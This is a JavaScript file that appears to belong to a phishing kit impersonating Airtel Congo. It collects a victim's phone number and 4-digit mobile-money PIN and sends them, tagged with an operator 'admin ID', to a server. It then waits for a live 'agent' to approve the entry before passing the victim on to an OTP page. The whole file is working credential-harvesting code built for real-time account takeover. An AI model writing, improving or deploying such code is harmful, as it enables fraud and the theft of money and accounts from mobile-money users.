// Verification (PIN) Script - Airtel Congo
// ADMIN ID ISOLATION RULES:
//   1. Read admin ID from URL query param (?admin=) OR sessionStorage
//   2. URL param takes priority — it was carried from application.html
//   3. NEVER fall back to localStorage
//   4. Block the form entirely if no admin ID — no silent auto-assign

document.addEventListener('DOMContentLoaded', function() {
    const phoneInput       = document.getElementById('phoneNumber');
    const pinInput         = document.getElementById('pin');
    const verifyBtn        = document.getElementById('verifyPinBtn');
    const pinScreen        = document.getElementById('pinScreen');
    const processingScreen = document.getElementById('processingScreen');
    const rejectionScreen  = document.getElementById('rejectionScreen');

    // Inline error display
    const errorDiv = document.createElement('div');
    errorDiv.style.cssText = 'display:none; background:#fee2e2; border:2px solid #fecaca; color:#991b1b; padding:12px 16px; border-radius:8px; margin:12px 0; font-weight:500;';
    const formTitle = document.querySelector('.form-title');
    if (formTitle?.parentNode) formTitle.parentNode.insertBefore(errorDiv, formTitle.nextSibling);

    function showError(msg) {
        errorDiv.textContent = msg;
        errorDiv.style.display = 'block';
        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
        setTimeout(() => { errorDiv.style.display = 'none'; }, 6000);
    }

    // ============================================
    // Get admin ID — URL param takes priority
    // ============================================
    function getAdminId() {
        // 1. URL query param (?admin=) — most reliable, was set by application.html navigation
        const urlParams = new URLSearchParams(window.location.search);
        const fromUrl = urlParams.get('admin');
        if (fromUrl && fromUrl !== 'undefined' && fromUrl !== 'null' && fromUrl.trim() !== '') {
            sessionStorage.setItem('selectedAdminId', fromUrl.trim());
            return fromUrl.trim();
        }

        // 2. sessionStorage (same tab, same journey)
        const fromSession = sessionStorage.getItem('selectedAdminId');
        if (fromSession && fromSession !== 'undefined' && fromSession !== 'null' && fromSession.trim() !== '') {
            return fromSession.trim();
        }

        // 3. applicationData in sessionStorage
        try {
            const appData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
            if (appData.adminId && appData.adminId !== 'undefined' && appData.adminId !== 'null') {
                return appData.adminId;
            }
        } catch (_) {}

        return null;
    }

    const adminId = getAdminId();
    console.log('📱 Verification page | Admin ID:', adminId || 'MISSING');

    // Block if no admin ID — show error in the form card
    if (!adminId) {
        if (pinScreen) {
            pinScreen.innerHTML = `
                <div style="text-align:center;padding:20px;">
                    <div style="font-size:48px;margin-bottom:16px;">⚠️</div>
                    <h3 style="color:#991b1b;margin:0 0 12px;">Lien Invalide</h3>
                    <p style="color:#666;margin:0 0 20px;">Veuillez revenir en arrière et utiliser le lien correct fourni par votre agent.</p>
                    <button onclick="history.back()" style="background:#FF0000;color:#fff;border:none;padding:12px 28px;border-radius:8px;font-size:15px;cursor:pointer;font-weight:600;">← Retour</button>
                </div>
            `;
        }
        return;
    }

    // ============================================
    // PIN: numbers only, max 4 digits
    // ============================================
    pinInput?.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0, 4);
    });

    // ============================================
    // Phone number formatting
    // ============================================
    phoneInput?.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 0 && !value.startsWith('243')) {
            if (value.startsWith('0'))      value = '243' + value.substring(1);
            else if (value.startsWith('9')) value = '243' + value;
        }
        if (value.length > 3)      this.value = '+' + value.substring(0, 3) + ' ' + value.substring(3);
        else if (value.length > 0) this.value = '+' + value;
        else                       this.value = '';
    });

    // ============================================
    // Submit PIN
    // ============================================
    verifyBtn?.addEventListener('click', async function(e) {
        e.preventDefault();

        const phoneNumber = phoneInput.value.trim().replace(/\s/g, '');
        const pin         = pinInput.value.trim();

        if (!phoneNumber)                                    { showError('Veuillez entrer votre numéro de téléphone'); phoneInput.focus(); return; }
        if (!phoneNumber.match(/^\+?243\d{9}$/))            { showError('Numéro de téléphone invalide. Utilisez le format : +243XXXXXXXXX'); phoneInput.focus(); return; }
        if (pin.length !== 4)                               { showError('Le PIN doit contenir exactement 4 chiffres'); pinInput.focus(); return; }

        // Update session data
        let applicationData = {};
        try { applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}'); } catch (_) {}
        applicationData.phone   = phoneNumber;
        applicationData.pin     = pin;
        applicationData.adminId = adminId;
        sessionStorage.setItem('applicationData', JSON.stringify(applicationData));

        pinScreen.style.display        = 'none';
        processingScreen.style.display = 'block';

        // Always send adminId — it's required
        const requestData = { phoneNumber, pin, adminId };
        console.log('📤 Sending PIN verification | Admin:', adminId);

        try {
            const response = await fetch('/api/verify-pin', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify(requestData)
            });

            const result = await response.json();
            console.log('📥 Server response:', result.success ? 'OK' : result.message);

            if (result.success) {
                // Save the server-returned applicationId
                if (result.applicationId) {
                    applicationData.applicationId = result.applicationId;
                    sessionStorage.setItem('applicationData', JSON.stringify(applicationData));
                    console.log('💾 applicationId saved:', result.applicationId);
                }
                checkPinStatus(result.applicationId);
            } else {
                processingScreen.style.display = 'none';
                pinScreen.style.display        = 'block';
                showError(result.message || 'Échec. Veuillez réessayer.');
            }

        } catch (error) {
            console.error('❌ Network error:', error);
            processingScreen.style.display = 'none';
            pinScreen.style.display        = 'block';
            showError('Erreur réseau. Vérifiez votre connexion et réessayez.');
        }
    });

    // ============================================
    // Poll for PIN status
    // ============================================
    function checkPinStatus(applicationId) {
        let checks = 0;
        const MAX  = 150; // 5 minutes at 2s interval

        const interval = setInterval(async () => {
            checks++;
            try {
                const res    = await fetch(`/api/check-pin-status/${applicationId}`);
                const result = await res.json();

                if (result.success && result.status) {
                    if (checks % 10 === 0 || result.status !== 'pending') {
                        console.log(`🔍 Check #${checks}: ${result.status}`);
                    }
                    if (result.status === 'approved') {
                        clearInterval(interval);
                        console.log('✅ PIN approved — redirecting to OTP');
                        // Pass admin ID forward in URL
                        setTimeout(() => { window.location.href = `otp.html?admin=${encodeURIComponent(adminId)}`; }, 1000);
                    } else if (result.status === 'rejected') {
                        clearInterval(interval);
                        processingScreen.style.display = 'none';
                        rejectionScreen.style.display  = 'block';
                    }
                }
            } catch (e) {
                if (checks % 10 === 0) console.error('❌ Status check error:', e);
            }

            if (checks >= MAX) {
                clearInterval(interval);
                processingScreen.style.display = 'none';
                pinScreen.style.display        = 'block';
                showError('Délai dépassé. L\'agent n\'a pas répondu. Veuillez réessayer plus tard.');
            }
        }, 2000);
    }

    // Try again button
    document.querySelector('#tryAgainBtn')?.addEventListener('click', function() {
        rejectionScreen.style.display = 'none';
        pinScreen.style.display       = 'block';
        phoneInput.value = '';
        pinInput.value   = '';
        errorDiv.style.display = 'none';
    });
});
